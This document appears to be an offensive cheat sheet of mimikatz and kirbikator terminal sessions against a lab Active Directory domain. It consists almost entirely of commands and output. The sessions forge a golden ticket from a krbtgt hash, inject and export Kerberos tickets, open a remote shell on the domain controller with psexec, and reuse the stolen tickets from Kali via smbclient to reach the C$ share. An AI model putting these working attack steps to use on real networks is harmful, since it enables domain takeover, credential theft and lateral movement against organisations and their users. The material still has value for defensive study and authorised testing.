## Kerberos Modules
```
  .#####.   mimikatz 2.0 alpha (x64) release "Kiwi en C" (Oct  9 2015 00:33:13)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                     with 16 modules * * */


mimikatz # kerberos::
ERROR mimikatz_doLocal ; "(null)" command of "kerberos" module not found !

Module :        kerberos
Full name :     Kerberos package module
Description :

             ptt  -  Pass-the-ticket [NT 6]
            list  -  List ticket(s)
             tgt  -  Retrieve current TGT
           purge  -  Purge ticket(s)
          golden  -  Willy Wonka factory
            hash  -  Hash password to keys
             ptc  -  Pass-the-ccache [NT6]
           clist  -  List tickets in MIT/Heimdall ccache

mimikatz #
```

## Golden Ticket
```
mimikatz # kerberos::golden /user:Administrator /domain:sittingduck.info /sid:S-
1-5-21-2792304509-1851296738-3446580569 /krbtgt:994ceb7e251e5afc550eef79d8172d64
 /ticket:gold.kirbi
User      : Administrator
Domain    : sittingduck.info
SID       : S-1-5-21-2792304509-1851296738-3446580569
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 994ceb7e251e5afc550eef79d8172d64 - rc4_hmac_nt
Lifetime  : 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2025 11:28:5
4 PM
-> Ticket : gold.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

## Pass the Ticket

```
mimikatz # kerberos::ptt gold.kirbi
  0 - File 'gold.kirbi' : OK

mimikatz # kerberos::list

[00000000] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 10/26/2015 11:28:54 PM ; 10/23/2025 11:28:54 PM ; 10/23/2
025 11:28:54 PM
   Server Name       : krbtgt/sittingduck.info @ sittingduck.info
   Client Name       : Administrator @ sittingduck.info
   Flags 40e00000    : pre_authent ; initial ; renewable ; forwardable ;

mimikatz #
```

## Injecting tickets with Kirbikator
```
C:\Users\notanadmin\Desktop>kirbikator.exe lsa gold.kirbi

  .#####.   KiRBikator 1.0 (x86) release "Kiwi en C" (Feb  1 2015 03:37:29)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : Microsoft LSA API (multiple)
 < gold.kirbi (RFC KRB-CRED (#22))
 > Ticket Administrator@sittingduck.info-krbtgt~sittingduck.info@sittingduck.inf
o : injected
```

## Exporting active tickets
```
mimikatz # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ;
 forwardable ;
   * Saved to file     : 0-60a10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK
.INFO.kirbi

[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; f
orwardable ;
   * Saved to file     : 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK
.INFO.kirbi

[00000002] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;
   * Saved to file     : 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDU
CK.INFO.kirbi

[00000003] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : ldap/dc1.sittingduck.info @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;
   * Saved to file     : 3-40a50000-uberuser@ldap~dc1.sittingduck.info-SITTINGDU
CK.INFO.kirbi

[00000004] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : LDAP/dc1.sittingduck.info/sittingduck.info @ SITTINGDUCK.
INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;
   * Saved to file     : 4-40a50000-uberuser@LDAP~dc1.sittingduck.info~sittingdu
ck.info-SITTINGDUCK.INFO.kirbi
```

## PSEXEC with standard Kerberos tickets
```

mimikatz # kerberos::list

mimikatz # (EMPTY LIST)

mimikatz # kerberos::ptt 1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK
.INFO.kirbi
  0 - File '1-40e10000-uberuser@krbtgt~SITTINGDUCK.INFO-SITTINGDUCK.INFO.kirbi'
: OK

mimikatz # kerberos::ptt 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDU
CK.INFO.kirbi
  0 - File '2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi
' : OK

mimikatz # kerberos::list

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:31 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : krbtgt/SITTINGDUCK.INFO @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; f
orwardable ;

[00000001] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 10/26/2015 11:39:32 PM ; 10/27/2015 9:39:31 AM ; 11/2/201
5 11:39:31 PM
   Server Name       : cifs/dc1.sittingduck.info @ SITTINGDUCK.INFO
   Client Name       : uberuser @ SITTINGDUCK.INFO
   Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewa
ble ; forwardable ;

mimikatz #



C:\Users\notanadmin\Desktop>psexec \\dc1 cmd.exe

PsExec v1.97 - Execute processes remotely
Copyright (C) 2001-2009 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
sittingduck\uberuser

C:\Windows\system32>echo %COMPUTERNAME%
DC1

C:\Windows\system32>
```




## Convert Mimikatz Kerberos ticket to CCache and use
```
C:\Users\notanadmin\Desktop>kirbikator.exe ccache "2-40a50000-uberuser@cifs~dc1.
sittingduck.info-SITTINGDUCK.INFO.kirbi"

  .#####.   KiRBikator 1.0 (x86) release "Kiwi en C" (Feb  1 2015 03:37:29)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com                      (oe.eo)
  '#####'                                                     * * */

Destination : MIT Credential Cache (simple)
 < 2-40a50000-uberuser@cifs~dc1.sittingduck.info-SITTINGDUCK.INFO.kirbi (RFC KRB
-CRED (#22))
 > Single file : uberuser@SITTINGDUCK.INFO.ccache

C:\Users\notanadmin\Desktop>
```

### Method 1

```
KRB5CCNAME=uberuser@SITTINGDUCK.INFO.ccache smbclient -k //dc1.sittingduck.info/c$
OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]
smb: \> 
```

### Method 2
```
root@kali:~# apt-get install krb5-user
Reading package lists... Done
Building dependency tree       
Reading state information... Done
The following extra packages will be installed:
  krb5-config libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7
Suggested packages:
  krb5-doc
The following NEW packages will be installed:
  krb5-config krb5-user libgssrpc4 libkadm5clnt-mit9 libkadm5srv-mit9 libkdb5-7
0 upgraded, 6 newly installed, 0 to remove and 0 not upgraded.
Need to get 466 kB of archives.
After this operation, 1,199 kB of additional disk space will be used.
Do you want to continue? [Y/n] y
0% [Connecting to http.kali.org]
<SNIP>
<SNIP>
<SNIP>

root@kali:~/Desktop# klist
klist: Credentials cache file '/tmp/krb5cc_0' not found
root@kali:~/Desktop# cp uberuser@SITTINGDUCK.INFO.ccache /tmp/krb5cc_0
root@kali:~/Desktop# smbclient -k //dc1.sittingduck.info/c$
OS=[Windows Server 2012 R2 Standard 9600] Server=[Windows Server 2012 R2 Standard 6.3]
smb: \> 
```

